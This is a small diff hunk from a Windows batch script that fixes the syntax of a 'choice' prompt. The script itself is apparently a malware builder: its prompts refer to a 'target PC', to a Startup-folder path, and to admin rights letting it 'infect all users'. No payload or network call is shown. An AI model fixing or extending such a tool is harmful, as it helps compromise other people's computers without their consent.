@@ -30,7 +30,7 @@ if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Progr
 :: manual configuration
 echo do you have admin permissions on the target PC?
 echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
-choice YN /m "does target PC have admin rights? Y/N:
+choice /C YN /m "does target PC have admin rights? Y/N:
 echo.
 echo DO NOT USE SPACES, replace them with _
 echo.
